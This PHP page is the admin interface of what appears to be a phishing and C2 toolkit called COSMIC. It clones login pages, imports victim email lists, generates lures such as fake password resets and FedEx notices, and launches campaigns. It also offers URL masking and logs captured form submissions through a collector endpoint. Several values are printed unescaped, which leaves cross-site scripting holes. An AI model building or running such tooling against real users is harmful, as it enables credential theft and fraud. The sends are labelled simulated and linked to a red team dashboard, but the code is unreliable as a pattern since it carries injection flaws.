<?php
require_once __DIR__ . '/includes/security_functions.php';
require_once __DIR__ . '/../system/modules/phishing/PhishingCampaign.php';

$phish = new PhishingCampaign();
$campaigns = $phish->getCampaigns();

// Get list of available local templates
$templateDir = __DIR__ . '/phishing/pages/CosmicTechLaws8008/';
$templates = [];
if (is_dir($templateDir)) {
    $files = scandir($templateDir);
    foreach ($files as $f) {
        if (is_file($templateDir . $f) && preg_match('/\.html$/', $f)) {
            $templates[] = $f;
        }
    }
}

$message = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['create_campaign'])) {
        $name = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['campaign_name']);
        $useTemplate = !empty($_POST['template_file']);
        
        if (!$name) {
            $error = "Campaign name is required.";
        } elseif ($useTemplate) {
            // Create campaign from local template
            $templateName = $_POST['template_file'];
            // Create campaign record (target URL can be a placeholder)
            $cid = $phish->createCampaign($name, 'http://local');
            
            $safeName = preg_replace('/[^a-z0-9_-]/i', '_', $name);
            $targetDir = __DIR__ . "/phishing/pages/$safeName/";
            if (!is_dir($targetDir)) {
                mkdir($targetDir, 0755, true);
            }
            $srcFile = $templateDir . $templateName;
            $dstFile = $targetDir . 'index.html';
            if (copy($srcFile, $dstFile)) {
                $clonePath = "/phishing/pages/$safeName/";
                // Update campaign with clone_path
                $phish->updateClonePath($cid, $clonePath);
                $message = "Campaign created from local template! Clone available at <a href='$clonePath' target='_blank'>$clonePath</a>";
            } else {
                $error = "Failed to copy template.";
            }
        } else {
            // Clone from URL
            $url = filter_var($_POST['target_url'], FILTER_VALIDATE_URL);
            if ($url) {
                try {
                    $cid = $phish->createCampaign($name, $url);
                    $clonePath = $phish->clonePage($cid, $url);
                    $message = "Campaign created! Clone available at <a href='$clonePath' target='_blank'>$clonePath</a>";
                } catch (Exception $e) {
                    $error = "Failed to create campaign: " . $e->getMessage();
                }
            } else {
                $error = "Invalid target URL.";
            }
        }
    } elseif (isset($_POST['import_targets'])) {
        $cid = (int)$_POST['campaign_id'];
        $csv = $_FILES['targets_csv']['tmp_name'];
        if ($csv && ($handle = fopen($csv, 'r')) !== false) {
            $targets = [];
            while (($data = fgetcsv($handle)) !== false) {
                if (filter_var($data[0], FILTER_VALIDATE_EMAIL)) {
                    $targets[] = ['email' => $data[0], 'name' => $data[1] ?? ''];
                }
            }
            fclose($handle);
            $imported = $phish->importTargets($cid, $targets);
            $message = "Imported $imported targets.";
        } else {
            $error = "Please upload a valid CSV file (email,name).";
        }
    } elseif (isset($_POST['generate_template'])) {
        $type = $_POST['template_type'];
        $campaignId = (int)$_POST['campaign_id'];
        $campaign = $phish->getCampaign($campaignId);
        if ($campaign) {
            $link = get_base_url() . $campaign['clone_path'];
            $template = $phish->generateEmailTemplate($type, $campaign['name'], $link);
            if ($phish->updateEmailTemplate($campaignId, $template)) {
                $message = "Template generated and saved.";
            } else {
                $error = "Failed to save template.";
            }
        } else {
            $error = "Campaign not found.";
        }
    } elseif (isset($_POST['launch'])) {
        $cid = (int)$_POST['campaign_id'];
        $sent = $phish->sendEmails($cid);
        $message = "Launched campaign: $sent emails sent (simulated).";
    } elseif (isset($_POST['delete_campaign'])) {
        $cid = (int)$_POST['campaign_id'];
        $phish->deleteCampaign($cid);
        $message = "Campaign deleted.";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🎣 COSMIC Phishing Campaign Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/assets/css/cosmic-c2.css">
    <style>
        .campaign-card { background:rgba(0,255,255,0.05); border:1px solid #0ff; border-radius:8px; padding:15px; margin-bottom:15px; }
        .stat { display:inline-block; margin-right:20px; color:#0f0; }
    </style>
    <script src="/assets/js/unified-quicknav.js" defer></script>
</head>
<body class="cosmic-scroll-body">
<?php require_once __DIR__ . "/includes/navigation.php"; echo render_cosmic_navigation(); ?>
    <div class="main-content" style="margin-left:20px;">
        <h1>🎣 COSMIC Phishing Campaign Manager</h1>

        <?php if ($message): ?><div class="success-box"><?php echo $message; ?></div><?php endif; ?>
        <?php if ($error): ?><div class="error-box"><?php echo $error; ?></div><?php endif; ?>

        <!-- Quick links (include URL Masker etc.) -->
        <div class="quick-links">
            <a href="url-masker.php" class="btn">🔗 URL Masker</a>
            <a href="c2-dashboard.php" class="btn">🎮 C2</a>
            <a href="redteam-dashboard.php" class="btn">🔴 Red Team</a>
        </div>

        <div class="glass-panel">
            <h2>Create New Campaign</h2>
            <form method="post">
                <div style="margin-bottom:15px;">
                    <label>Campaign Name (no spaces):</label>
                    <input type="text" name="campaign_name" required>
                </div>
                <div style="margin-bottom:15px;">
                    <label>Target URL (page to clone):</label>
                    <input type="url" name="target_url" placeholder="https://example.com/login">
                </div>
                <div class="form-group">
                    <label>Or use local template:</label>
                    <select name="template_file">
                        <option value="">-- Clone from URL --</option>
                        <?php foreach ($templates as $t): ?>
                            <option value="<?php echo $t; ?>"><?php echo $t; ?></option>
                        <?php endforeach; ?>
                    </select>
                </div>
                <button type="submit" name="create_campaign" class="btn">Create Campaign</button>
            </form>
        </div>

        <h2>Existing Campaigns</h2>
        <?php foreach ($campaigns as $c): ?>
        <div class="campaign-card">
            <h3><?php echo htmlspecialchars($c['name']); ?> <span style="color:#0ff;">(ID: <?php echo $c['id']; ?>)</span></h3>
            <p>Target: <?php echo htmlspecialchars($c['target_url']); ?></p>
            <p>Clone: 
                <?php if (!empty($c['clone_path'])): ?>
                    <a href="<?php echo $c['clone_path']; ?>" target="_blank"><?php echo $c['clone_path']; ?></a>
                <?php else: ?>
                    <span style="color:#f00;">Not cloned yet</span>
                <?php endif; ?>
            </p>
            <p>Status: <?php echo $c['status']; ?> | Clicks: <?php echo $c['clicks']; ?> | Submissions: <?php echo $c['submissions'] ?? 0; ?></p>

            <div style="margin-top:15px;">
                <!-- View Page Button -->
                <?php if (!empty($c['clone_path'])): ?>
                    <a href="<?php echo $c['clone_path']; ?>" class="btn" target="_blank">👁️ View Page</a>
                <?php endif; ?>

                <!-- Mask URL Button (pre‑fill target) -->
                <a href="url-masker.php?prefill=<?php echo urlencode(get_base_url() . $c['clone_path']); ?>" class="btn">🔗 Mask URL</a>

                <!-- Import Targets Form -->
                <form method="post" enctype="multipart/form-data" style="display:inline-block; margin-right:10px;">
                    <input type="hidden" name="campaign_id" value="<?php echo $c['id']; ?>">
                    <input type="file" name="targets_csv" accept=".csv" required style="display:inline-block; width:auto;">
                    <button type="submit" name="import_targets" class="btn">Import Targets</button>
                </form>

                <!-- Generate Template Form -->
                <form method="post" style="display:inline-block; margin-right:10px;">
                    <input type="hidden" name="campaign_id" value="<?php echo $c['id']; ?>">
                    <select name="template_type">
                        <option value="password_reset">Password Reset</option>
                        <option value="invoice">Invoice</option>
                        <option value="security_alert">Security Alert</option>
                        <option value="newsletter">Newsletter</option>
                        <option value="fedex">FedEx Delivery</option>
                    </select>
                    <button type="submit" name="generate_template" class="btn">Generate Template</button>
                </form>

                <!-- Launch Campaign -->
                <form method="post" style="display:inline-block;">
                    <input type="hidden" name="campaign_id" value="<?php echo $c['id']; ?>">
                    <button type="submit" name="launch" class="btn btn-primary">Launch Campaign</button>
                </form>

                <!-- Delete Campaign -->
                <form method="post" style="display:inline-block;">
                    <input type="hidden" name="campaign_id" value="<?php echo $c['id']; ?>">
                    <button type="submit" name="delete_campaign" class="btn btn-danger" onclick="return confirm('Delete this campaign? All targets and emails will be lost.')">🗑️ Delete</button>
                </form>
            </div>

            <?php if ($c['email_template']): ?>
            <div style="margin-top:15px; background:#000; padding:10px; border-radius:5px;">
                <pre><?php echo htmlspecialchars($c['email_template']); ?></pre>
            </div>
            <?php endif; ?>
        </div>
        <?php endforeach; ?>

        <div class="glass-panel">
            <h2>Collector Endpoint</h2>
            <p>All form submissions are sent to <code>/phishing/collect.php</code> and logged in <code>data/phishing/logs/</code>.</p>
            <p>To track clicks, append <code>?email=target@example.com</code> to your phishing link.</p>
        </div>
    </div>
</body>
</html>
